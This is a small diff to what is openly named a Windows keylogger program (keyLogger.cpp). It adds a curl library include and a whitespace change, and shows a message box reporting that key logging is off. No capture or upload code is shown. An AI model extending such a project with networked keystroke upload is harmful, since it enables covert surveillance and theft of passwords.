@@ -1,6 +1,7 @@
 // keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include <Windows.h>
+#include </curl/include/curl/curl.h>
 #include <iostream>
 #include <fstream>
 #include <sstream>
@@ -39,7 +40,7 @@ int main()
     }
 
     MessageBox(NULL, "Key Logging Status: OFF", "Julian's USB", MB_OK | MB_ICONASTERISK);
-    
+
     return 0;
 }
 
